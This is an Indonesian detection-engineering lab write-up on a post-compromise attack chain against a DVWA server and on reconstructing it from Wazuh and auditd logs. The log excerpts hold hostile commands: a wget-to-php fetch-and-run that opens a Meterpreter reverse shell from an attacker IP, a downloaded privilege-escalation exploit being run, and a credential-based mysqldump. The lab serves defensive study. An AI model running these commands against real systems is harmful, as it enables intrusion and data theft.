# Post-Compromise Activity — DVWA (Detection Engineering Lab)

> **Status: completed.** Lab ini mendokumentasikan serangkaian aktivitas post-compromise pada Web Server DVWA yang bertujuan untuk menghasilkan dataset log bagi proses analisis Detection Engineering menggunakan Wazuh. Fokus utama bukan memperoleh kompromi penuh terhadap sistem, melainkan mengamati artefak yang dihasilkan oleh setiap aktivitas attacker serta mengevaluasi coverage deteksi dan noise alert pada berbagai data source.

---

# Tujuan

Lab ini merupakan lanjutan dari skenario **File Upload** yang sebelumnya telah berhasil memperoleh initial access melalui webshell.

Berbeda dengan pendekatan penetration testing tradisional yang berorientasi pada keberhasilan memperoleh hak akses tertinggi, lab ini berfokus pada proses **pengumpulan artefak log** yang dihasilkan selama aktivitas post-compromise. Setiap aktivitas yang dilakukan dipilih berdasarkan kemampuannya menghasilkan event yang dapat dianalisis melalui Wazuh, auditd, Apache Access Log, maupun data source lainnya.

Initial access yang telah diperoleh digunakan sebagai titik awal untuk mensimulasikan aktivitas lanjutan seperti eksekusi command, pembentukan command and control, enumerasi sistem, pengumpulan credential, serta akses terhadap database aplikasi.

Dengan pendekatan ini, keberhasilan maupun kegagalan suatu teknik sama-sama dianggap sebagai hasil eksperimen selama menghasilkan informasi yang dapat digunakan untuk mengevaluasi rule deteksi maupun mengidentifikasi blind spot pada sistem monitoring.

Prinsip utama lab ini tetap sama dengan seluruh seri sebelumnya.

> **Detection First, Exploitation Second.**

---

# Activity Coverage

| Phase                | Aktivitas                           | Tujuan                                        | Status |
| -------------------- | ----------------------------------- | --------------------------------------------- | ------ |
| Initial Access       | Reuse webshell dari lab File Upload | Memperoleh foothold                           | ✅      |
| Command Execution    | Menjalankan command melalui B374K   | Menghasilkan process execution                | ✅      |
| Command & Control    | Membentuk Meterpreter session       | Menghasilkan artefak network dan process      | ✅      |
| Enumeration          | Menjalankan LinPEAS                 | Mengidentifikasi peluang privilege escalation | ✅      |
| Credential Access    | Mengambil credential aplikasi       | Menguji akses terhadap konfigurasi            | ✅      |
| Privilege Escalation | Validasi berbagai temuan LinPEAS    | Tidak berhasil dieksploitasi                  | ❌      |
| Collection           | Mengambil database DVWA             | Simulasi objective attacker                   | ✅      |

---

# Prerequisites

* DVWA
* Apache2
* PHP
* Wazuh Agent
* auditd
* Kali Linux
* Metasploit Framework
* LinPEAS

---

# Step-by-Step

## Phase 1 — Initial Access

Lab dimulai dengan me-reuse foothold yang telah diperoleh pada lab **File Upload**.

Webshell B374K yang sebelumnya berhasil diunggah menggunakan fitur File Upload DVWA tetap digunakan sebagai media initial access sehingga tidak diperlukan proses eksploitasi ulang.

Seluruh aktivitas berikutnya dilakukan melalui webshell tersebut.

---

## Phase 2 — Command & Control

Setelah memperoleh webshell, tahap berikutnya adalah membentuk channel Command & Control yang lebih stabil.

Payload Meterpreter berbasis PHP dipersiapkan menggunakan payload `php/meterpreter/reverse_tcp`.

Payload tersebut kemudian di-host pada mesin Kali menggunakan HTTP server sederhana sehingga dapat diunduh dari Web Server.

Melalui webshell B374K, payload diunduh ke target dan kemudian dijalankan. Pada sisi attacker, Metasploit Framework telah dikonfigurasi untuk menerima koneksi sesuai dengan payload yang digunakan sehingga berhasil diperoleh session Meterpreter.

Perlu dicatat bahwa pada fase ini webshell hanya berfungsi sebagai **trigger** untuk menjalankan payload. Setelah reverse connection berhasil terbentuk, komunikasi attacker tidak lagi bergantung pada request HTTP menuju webshell, melainkan menggunakan channel komunikasi baru yang dibangun oleh payload Meterpreter.

---

## Phase 3 — Persistence Attempt

Sebagai bagian dari eksperimen, dilakukan percobaan untuk menyimpan payload pada direktori `/var/tmp` menggunakan nama file yang lebih menyerupai file sistem serta membuat mekanisme persistence menggunakan cron.

Percobaan tersebut tidak berhasil karena keterbatasan hak akses user yang digunakan.

Meskipun demikian, aktivitas ini tetap dipertahankan dalam eksperimen karena menghasilkan artefak log yang relevan untuk dianalisis pada sisi defender.

---

## Phase 4 — Enumeration

Setelah memperoleh session Meterpreter, proses enumerasi dilakukan menggunakan LinPEAS untuk mengidentifikasi peluang privilege escalation maupun konfigurasi yang berpotensi disalahgunakan.



Beberapa temuan penting antara lain:

### Kernel Vulnerabilities

LinPEAS mengidentifikasi beberapa kandidat kerentanan kernel yang secara teori dapat digunakan sebagai jalur privilege escalation.

Namun setelah dilakukan validasi terhadap lingkungan lab, teknik tersebut tidak dapat dieksploitasi sehingga tidak digunakan lebih lanjut.

### Credential Discovery

Credential aplikasi ditemukan pada file konfigurasi `config.inc.php`.

Temuan ini kemudian digunakan sebagai sumber credential aplikasi tanpa perlu melakukan proses cracking maupun brute force.

### PHP Misconfiguration

LinPEAS juga mengidentifikasi beberapa konfigurasi PHP yang berkaitan dengan mekanisme File Inclusion yang sebelumnya telah dimanfaatkan pada lab lain.

Temuan ini digunakan sebagai referensi untuk memvalidasi konsistensi hasil antar laboratorium.

#### LinPEAS Output

Seluruh hasil enumerasi menggunakan LinPEAS dapat dilihat pada:

- [`asset/output-linpeas.txt`](./asset/output-linpeas.txt)

Output tersebut digunakan sebagai dasar validasi pada fase Enumeration.

### Writable Files

Beberapa file sistem seperti `/etc/bash.bashrc` dan `/etc/profile` ditandai sebagai kandidat writable.

Namun setelah dilakukan verifikasi manual, kedua temuan tersebut merupakan false positive dan tidak dapat dimanfaatkan sebagai persistence maupun privilege escalation.

### Existing User

Selain user bawaan aplikasi, ditemukan pula akun pengguna yang memang digunakan untuk mengelola Web Server selama proses pembangunan lab.

Karena fokus penelitian ini bukan mengevaluasi kekuatan password maupun teknik brute force, akun tersebut digunakan secara langsung untuk melanjutkan eksperimen tanpa dilakukan simulasi password attack.

Seluruh hasil enumerasi LinPEAS dilampirkan pada:

```
/full-attack-chain/asset/output-linpeas.txt
```

---

## Phase 5 — Collection

Karena privilege escalation tidak berhasil diperoleh, eksperimen dilanjutkan menggunakan credential aplikasi yang ditemukan pada tahap sebelumnya.

Credential tersebut digunakan untuk mengakses database DVWA sebagai simulasi objective attacker.

Proses transfer file dilakukan menggunakan kemampuan upload dan download yang disediakan oleh session Meterpreter sehingga aktivitas collection tetap dapat dilakukan tanpa memerlukan hak akses root.

---

# Detection Perspective

Seluruh aktivitas pada lab ini dirancang untuk menghasilkan berbagai jenis artefak yang dapat dianalisis oleh defender.

Beberapa artefak yang diharapkan muncul antara lain:

* HTTP request menuju webshell.
* Process execution yang dipicu oleh Apache/PHP.
* Pembentukan koneksi outbound sebagai channel Command & Control.
* Aktivitas enumerasi sistem.
* Akses terhadap file konfigurasi aplikasi.
* Aktivitas transfer file menggunakan session Meterpreter.
* Percobaan persistence yang gagal.

Setiap artefak tersebut kemudian digunakan sebagai dasar evaluasi terhadap rule Wazuh yang telah dibuat sebelumnya.

---

# Analisis Insiden (SOC Analyst Review)

Rekonstruksi kronologis berdasarkan data auditd (`data.audit.execve`) yang diekspor dari Wazuh Dashboard: [`asset/On_demand_report_2026-07-31T08_49_57.572Z_cec17040-8cbc-11f1-b3c4-7ff0e131d5d1.csv`](./asset/On_demand_report_2026-07-31T08_49_57.572Z_cec17040-8cbc-11f1-b3c4-7ff0e131d5d1.csv). Data hasil LinPEAS pada 30 Juli tidak ke-capture SIEM karena Dell (SIEM host) sempat mati di tanggal tersebut, sehingga seluruh analisis berikut disusun ulang dari data auditd yang tersedia di tanggal 31 Juli, mulai jam 13:55:20.

### Event 1 — 31 Juli 2026, 13:55:20 — Webshell Interpreter Self-Check (Anomaly Baseline)

```
uid=33(www-data)  cwd=/var/www/html/hackable/uploads  ppid=1720/1722 (apache worker)
execve: sh -c "python -V 2>&1"
execve: sh -c "perl -e \"print $]\" 2>&1"      → berhasil (perl terinstall)
execve: sh -c "ruby -v 2>&1"
execve: sh -c "nodejs -v 2>&1"
execve: sh -c "gcc -dumpversion 2>&1"
execve: sh -c "node -v 2>&1"
execve: sh -c "java -version 2>&1"
execve: sh -c "javac -version 2>&1"
execve: ps aux                                  → berhasil
```

Sembilan proses `sh` di-fork nyaris bersamaan (rentang <20ms) oleh user `www-data`, masing-masing mencoba mengeksekusi satu interpreter berbeda. Ini bukan behavior normal Apache/PHP — `www-data` di web server ini seharusnya cuma butuh PHP untuk melayani DVWA, gak ada alasan legit buat cek ketersediaan Python/Ruby/Node.js/GCC/Java sekaligus dalam satu batch. Pola dan urutan pengecekan ini konsisten dengan fitur *self-check* interpreter yang biasa ada di webshell (mis. B374K) untuk menentukan opsi reverse shell apa aja yang bisa dipakai di target. Dari 9 interpreter yang dicoba, cuma `perl` yang berhasil exec (execve sukses tercatat) — sisanya (python, ruby, nodejs, gcc, node, java, javac) gak punya record exec lanjutan, artinya binary tersebut memang tidak terinstall di sistem sehingga shell gagal sebelum sempat mencapai syscall `execve`.

### Event 2 — 31 Juli 2026, 14:03:31–14:03:44 — Command & Control Establishment

```
14:03:31.044  sh -c "wget -qO- http://192.168.43.111/payload.php | php & 2>&1"   (pid 2984)
14:03:31.046  php  (pid 2986, ppid 2984)
14:03:44.766  sh   (pid 2987, ppid 2986)   ← child dari proses php di atas
14:03:44.817  sh   (pid 2988, ppid 2987)   ← jadi parent seluruh command berikutnya s/d ~15:18
```

Web server mengunduh `payload.php` dari `192.168.43.111` (host attacker, berada di subnet hotspot 192.168.43.0/24 — sama seperti posisi Kali Linux di topologi lab ini) lalu langsung dieksekusi via pipe ke `php`. Tigapuluh detik kemudian, proses `php` (pid 2986) tersebut men-spawn shell anak (pid 2987 → 2988) — pola child-process dari proses PHP yang sebelumnya cuma dipakai untuk fetch-and-run adalah indikator kuat proses tersebut sudah jadi C2 channel interaktif (reverse shell), bukan sekadar one-shot execution. Seluruh aktivitas command execution dari titik ini sampai ~15:18 (fase enumerasi, upload backdoor, credential access) adalah anak/cucu dari pid 2988, dikonfirmasi lewat PPID lineage.

### Event 3 — 31 Juli 2026, 14:04:46–14:27:56 — Local Enumeration & Target User Discovery

```
14:04:46  ls -la /etc/bash.bashrc
14:05:18  ls -la /etc/profile
14:09:22  namei -l /etc/bash.bashrc
14:10:16  cat /etc/bash.bashrc
14:13:10  ls -la /etc/bash.bashrc            (verifikasi ulang)
14:16:14  ls -la /home
14:16:22  ls -la /home/anang                 ← target user diidentifikasi
14:16:40  sudo -la /home/anang               (euid tetap 33 — gagal, www-data bukan sudoer)
14:21:02  aa-status ; grep bash
14:23:04  ntfs-3g --version
14:23:42  sudo --version
14:24:56  strings /usr/lib/cargo/bin/sudo | grep -i "version|vuln|password|backdoor"
14:25:30  sudo -l
14:25:54  sudo /bin/bash                     (gagal, tanpa TTY gak ada password prompt)
14:27:56  uname -r
```

Fase ini adalah enumerasi privilege escalation manual: attacker cek writability `/etc/bash.bashrc` dan `/etc/profile` (vector persistence/hijack), status AppArmor, versi `ntfs-3g` dan `sudo` (dicek lewat `strings | grep -i vuln` — pola pencarian CVE dalam binary suid, konsisten dengan usaha mencari kerentanan versi seperti Baron Samedit/CVE-2021-3156), dan kernel version. Yang paling signifikan: di jam **14:16:22**, attacker menjalankan `ls -la /home/anang` — ini titik di mana username `anang` pertama kali teridentifikasi oleh attacker, lebih dari satu jam sebelum percobaan `su anang` di Event 6. Percobaan `sudo -la /home/anang` dan `sudo /bin/bash` sama-sama gagal karena `www-data` memang tidak terdaftar sebagai sudoer.

### Event 4 — 31 Juli 2026, 14:39:11 & 14:58:27 — Upload Backdoor Tambahan

```
14:39:11.213  File added: /var/www/html/hackable/uploads/cf.py  (size 1432, owner www-data)
14:58:27.511  File added: /var/www/html/hackable/uploads/dc.py  (size 0)
14:58:27.582  File modified: /var/www/html/hackable/uploads/dc.py  (size 6066)
```

Dua file Python (`cf.py`, `dc.py`) diunggah ke direktori upload yang sama dengan webshell awal. Pola `dc.py` yang muncul kosong lalu langsung ter-modifikasi 0.07 detik kemudian menunjukkan proses create-then-write standar (file dibuat lebih dulu, isinya ditulis menyusul) — bukan dua event terpisah. Kemungkinan besar ini adalah shell/backdoor cadangan agar attacker tidak kehilangan akses kalau channel C2 utama (Event 2) terputus.

### Event 5 — 31 Juli 2026, 15:07:35–15:08:37 — Percobaan Privilege Escalation (Gagal)

```
15:07:35.820  wget http://192.168.43.111/exploit_pedit -O /tmp/exploit_pedit
15:07:57.738  chmod +x /tmp/exploit_pedit
15:08:23.759  wget -qO- http://192.168.43.111/payload.php   (re-fetch payload, C2 kedua)
15:08:37.636  /tmp/exploit_pedit                             (euid tetap 33 setelah exec)
```

Binary exploit diunduh, di-chmod executable, lalu dieksekusi. Nama binary (`exploit_pedit`) mengarah ke exploit kelas PwnKit/policykit editor. Setelah eksekusi, `euid` proses tetap 33 (www-data) — exploit tidak berhasil menaikkan privilege, konsisten dengan temuan LinPEAS sebelumnya bahwa privilege escalation lewat jalur kernel/binary vulnerability tidak berhasil di environment ini.

### Event 6 — 31 Juli 2026, 15:10:03–15:13:25 — Credential Access & Database Exfiltration

```
15:10:03.662  cat config.inc.php
15:10:17.685  mysql -u dvwa -p        (gagal)
15:11:33.692  mysql -u dvwa           (gagal)
15:11:43.806  mysql -u dvwa -p        (gagal)
15:13:25.770  mysqldump -u dvwa -p dvwa   → berhasil
```

Attacker membaca `config.inc.php` di direktori `/var/www/html/config` dan menemukan kredensial database aplikasi (`dvwa`). Tiga percobaan login MySQL sebelum akhirnya `mysqldump` berhasil dijalankan mengindikasikan proses trial-and-error (kemungkinan kredensial yang ditemukan butuh penyesuaian format/quote), bukan straight-through access. Hasil akhirnya: seluruh database `dvwa` berhasil di-dump — setara data exfiltration penuh terhadap aplikasi.

### Event 7 — 31 Juli 2026, 15:20:02–15:25:35 — Privilege Escalation ke User `anang` via `su`

```
15:20:02.083  su anang   (pid 3968, ppid 3967, dari www-data)
15:20:06.024  unix_chkpwd: password check failed for user anang
15:20:09.956  su: FAILED SU (to anang) www-data on none

15:21:37.895  su anang   (pid 3979, ppid 3967, dari www-data)
15:21:39.918  pam_unix(su:session): session opened for user anang(uid=1000) by (uid=33)   ← BERHASIL
15:25:08.234  pam_unix(su:session): session closed for user anang

15:25:32.079  sudo su    (gagal senyap — www-data bukan sudoer)
15:25:35.953  su anang   (pid 4028, gagal lagi)
15:25:35.989  su: FAILED SU (to anang) www-data on none
```

Ini titik paling kritis dalam attack chain. Setelah satu percobaan gagal, attacker (masih dari proses www-data/webshell yang sama, `tty=(none)`) **berhasil** melakukan `su anang` pada percobaan kedua dan memegang sesi sebagai user `anang` selama ±3,5 menit (15:21:39–15:25:08). Karena `su` berhasil dengan password asli (bukan exploit), ini indikasi kuat **credential reuse atau password lemah** pada akun `anang` — perlu dicek apakah passwordnya sama/mirip dengan kredensial database `dvwa` yang baru ditemukan di Event 6. Dua percobaan berikutnya (`sudo su`, `su anang` lagi) kembali gagal, menunjukkan attacker sempat mencoba memperluas akses lebih jauh ke root tapi tidak berhasil.

**Catatan disambiguasi penting:** ada sesi `anang` lain di log yang **bukan** bagian dari attack chain ini — login via proses `login` (bukan `su`) di jam 14:12:54, dengan pola `session opened for user anang(uid=1000) by anang(uid=0)` (self-login) dan berjalan di `TTY=/dev/tty1`. Sesi ini baru ditutup di 15:26:56 bersamaan dengan `sudo poweroff` yang juga dieksekusi dari `tty1`. Kombinasi mekanisme login (`login` vs `su`) dan field `TTY` (`tty1` vs `(none)`) adalah cara paling reliable untuk membedakan sesi operator lab (fisik/console) dari sesi attacker (lewat webshell) tanpa perlu menunggu konfirmasi manual — sesi `su` di atas yang di-spawn dari `uid=33` dengan `tty=(none)` adalah satu-satunya yang atribut ke attacker.

---

# Hasil

Eksperimen menunjukkan bahwa keberhasilan privilege escalation bukan merupakan syarat utama dalam membangun dataset Detection Engineering.

Sebaliknya, berbagai aktivitas yang dilakukan sebelum privilege escalation telah menghasilkan artefak log yang cukup kaya untuk dianalisis, mulai dari initial access, command execution, pembentukan command and control, enumerasi sistem, pengambilan credential, hingga collection terhadap data aplikasi.

Selain menghasilkan dataset log, eksperimen ini juga membantu mengidentifikasi beberapa false positive serta blind spot pada rule deteksi yang masih memerlukan penyempurnaan.

Dengan demikian, fokus utama lab ini berhasil dipertahankan, yaitu membangun kumpulan aktivitas realistis yang dapat digunakan sebagai dasar evaluasi kualitas deteksi dan pengurangan noise alert pada Wazuh.
